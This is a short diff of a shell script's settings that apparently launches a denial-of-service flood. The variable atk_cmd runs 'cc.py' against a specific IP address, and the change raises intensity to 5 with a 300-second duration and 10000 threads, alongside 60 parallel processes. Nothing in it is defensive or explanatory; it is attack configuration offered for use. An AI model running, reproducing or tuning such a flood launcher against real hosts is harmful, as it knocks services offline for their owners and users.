@@ -6,7 +6,7 @@
 #  Lastly run this script
 #
 #the command you want to exec
-atk_cmd="python3 cc.py -url http://50.7.198.146 -v 4"
+atk_cmd="python3 cc.py -url http://50.7.198.146 -v 5 -s 300 -t 10000"
 
 #number of process that you want
 process=60
